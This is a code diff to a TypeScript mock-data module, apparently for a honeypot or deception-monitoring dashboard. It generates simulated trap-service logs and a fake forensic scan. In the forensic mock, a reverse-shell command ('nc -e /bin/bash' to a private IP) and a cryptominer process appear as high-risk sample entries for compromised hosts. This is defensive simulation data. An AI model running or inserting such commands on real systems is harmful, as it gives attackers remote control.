@@ -199,7 +199,68 @@ export const generateRandomLog = (actors: Actor[]): LogEntry => {
   let message = "VPP Heartbeat ack";
   let sourceIp = undefined;
 
-  // --- NEW: SENTINEL MODE LOGIC ---
+  // --- NEW: TRAP INTERACTION SIMULATION ---
+  // If the actor has active tunnels, simulate specific service logs
+  if (actor.activeTunnels && actor.activeTunnels.length > 0 && Math.random() > 0.6) {
+      const tunnel = actor.activeTunnels[Math.floor(Math.random() * actor.activeTunnels.length)];
+      const trapType = tunnel.trap.serviceType;
+      const attackerIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+      
+      // Override log details
+      sourceIp = attackerIp;
+      
+      switch(trapType) {
+          case 'Redis':
+              process = 'redis-server';
+              level = Math.random() > 0.8 ? LogLevel.WARNING : LogLevel.INFO;
+              const redisMsgs = [
+                  `Accepted ${attackerIp}:54322`, 
+                  `(error) ERR unknown command 'config'`, 
+                  `AUTH failed: invalid password from ${attackerIp}`
+              ];
+              message = redisMsgs[Math.floor(Math.random() * redisMsgs.length)];
+              break;
+          case 'RDP':
+              process = 'xrdp-sesman';
+              level = LogLevel.WARNING;
+              message = `pam_unix(xrdp-sesman:auth): authentication failure; logname= uid=0 euid=0 tty=xrdp-sesman ruser= rhost= user=administrator`;
+              break;
+          case 'Oracle TNS':
+              process = 'oracle';
+              level = LogLevel.ERROR;
+              message = `TNS-12535: TNS:operation timed out ns secondary err code: 12560 nt main err code: 505`;
+              break;
+          case 'MongoDB':
+              process = 'mongod';
+              level = LogLevel.WARNING;
+              message = `[conn142]  authenticate db: admin { authenticate: 1, nonce: "xxx", user: "root", key: "xxx" }`;
+              break;
+          case 'FTP':
+              process = 'vsftpd';
+              level = LogLevel.WARNING;
+              message = `[${attackerIp}] FAIL LOGIN: Client "::ffff:${attackerIp}"`;
+              break;
+          default:
+              // Generic socat log for other types
+              process = 'socat';
+              level = LogLevel.INFO;
+              message = `Redirection: Transferred ${Math.floor(Math.random() * 1024)} bytes to Cloud Trap (${trapType})`;
+      }
+      
+      return {
+        id: Math.random().toString(36).substring(7),
+        timestamp: new Date(),
+        actorId: actor.id,
+        proxyId: actor.proxyId,
+        actorName: actor.name,
+        level,
+        process,
+        message,
+        sourceIp
+      };
+  }
+
+  // --- EXISTING LOGIC ---
   if (actor.tcpSentinelEnabled && Math.random() > 0.5) {
       // If Sentinel enabled, ANY random connection attempt is critical
       level = LogLevel.CRITICAL;
@@ -225,13 +286,6 @@ export const generateRandomLog = (actors: Actor[]): LogEntry => {
   } else if (Math.random() > 0.9) {
     level = LogLevel.ERROR;
     message = "VPP-Agent: Proxy connection timeout - retrying";
-  }
-
-  // Simulate socat log occasionally
-  if (Math.random() > 0.95 && actor.activeTunnels && actor.activeTunnels.length > 0) {
-      process = 'socat';
-      level = LogLevel.INFO;
-      message = `Redirection: Transferred ${Math.floor(Math.random() * 500)} bytes to Cloud Trap`;
   }
 
   return {
@@ -484,23 +538,46 @@ export const generateMockBluetooth = (actors: Actor[]): BluetoothDevice[] => {
 };
 
 // NEW: One-Click Forensic Mock
-export const performForensicScan = async (actorId: string): Promise<ForensicSnapshot> => {
+export const performForensicScan = async (actorId: string, mockContext?: Actor): Promise<ForensicSnapshot> => {
     return new Promise((resolve) => {
         setTimeout(() => {
-            const processes: ForensicProcess[] = [
+            let processes: ForensicProcess[] = [
                 { pid: '1', user: 'root', cpu: '0.1', mem: '0.5', command: '/sbin/init', risk: 'LOW' },
                 { pid: '812', user: 'root', cpu: '0.2', mem: '1.2', command: '/usr/sbin/sshd -D', risk: 'LOW' },
                 { pid: '2023', user: 'pi', cpu: '0.0', mem: '0.8', command: '-bash', risk: 'LOW' },
-                // Suspicious items
-                { pid: '4452', user: 'www-data', cpu: '45.2', mem: '12.4', command: './xmrig --donate-level 1', risk: 'HIGH' },
-                { pid: '4490', user: 'www-data', cpu: '0.1', mem: '0.2', command: 'nc -e /bin/bash 192.168.1.55 4444', risk: 'HIGH' }
             ];
 
-            const connections = [
+            let connections = [
                 'tcp   ESTAB      0      0          192.168.1.101:22          10.0.0.5:54322         users:(("sshd",pid=812,fd=3))',
-                'tcp   ESTAB      0      0          192.168.1.101:4444        192.168.1.55:8888      users:(("nc",pid=4490,fd=3))',
                 'tcp   LISTEN     0      128        0.0.0.0:80                0.0.0.0:*              users:(("apache2",pid=900,fd=3))'
             ];
+
+            // DYNAMIC: Add Socat Tunnels if they exist
+            if (mockContext && mockContext.activeTunnels) {
+                mockContext.activeTunnels.forEach((t, i) => {
+                    const pid = 3000 + i;
+                    // Add Socat Process
+                    processes.push({ 
+                        pid: pid.toString(), 
+                        user: 'root', 
+                        cpu: '0.5', 
+                        mem: '1.1', 
+                        command: `socat TCP-LISTEN:${t.localPort},fork SYSTEM:echo...`, 
+                        risk: 'MEDIUM' 
+                    });
+                    
+                    // Add ESTABLISHED connection simulating trap hit
+                    const attackerIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.5`;
+                    connections.push(`tcp   ESTAB      0      0          0.0.0.0:${t.localPort}          ${attackerIp}:49152    users:(("socat",pid=${pid},fd=4))`);
+                });
+            }
+
+            // Suspicious items (Randomly add if no tunnels, or always if compromised)
+            if (mockContext?.status === 'COMPROMISED') {
+                processes.push({ pid: '4452', user: 'www-data', cpu: '45.2', mem: '12.4', command: './xmrig --donate-level 1', risk: 'HIGH' });
+                processes.push({ pid: '4490', user: 'www-data', cpu: '0.1', mem: '0.2', command: 'nc -e /bin/bash 192.168.1.55 4444', risk: 'HIGH' });
+                connections.push('tcp   ESTAB      0      0          192.168.1.101:4444        192.168.1.55:8888      users:(("nc",pid=4490,fd=3))');
+            }
 
             const authLogs = [
                 'Oct 12 04:12:01 sshd[1202]: Accepted password for pi from 10.0.0.5 port 54322 ssh2',
@@ -512,9 +589,20 @@ export const performForensicScan = async (actorId: string): Promise<ForensicSnap
 
             const openFiles = [
                 'apache2  900 root  cwd   DIR  179,2     4096      2 /',
-                'nc      4490 www-data  txt   REG  179,2    31248 14221 /usr/bin/nc.openbsd',
-                'xmrig   4452 www-data  cwd   DIR  179,2     4096  3321 /tmp/.X11-unix'
             ];
+            
+            // Add open files for tunnels
+             if (mockContext && mockContext.activeTunnels) {
+                mockContext.activeTunnels.forEach((t, i) => {
+                     openFiles.push(`socat    ${3000+i} root  cwd   DIR  179,2     4096      2 /`);
+                     openFiles.push(`socat    ${3000+i} root  3u   IPv4  ${20000+i}      0t0  TCP *:${t.localPort} (LISTEN)`);
+                });
+             }
+
+            if (mockContext?.status === 'COMPROMISED') {
+                 openFiles.push('nc      4490 www-data  txt   REG  179,2    31248 14221 /usr/bin/nc.openbsd');
+                 openFiles.push('xmrig   4452 www-data  cwd   DIR  179,2     4096  3321 /tmp/.X11-unix');
+            }
 
             resolve({
                 timestamp: new Date(),
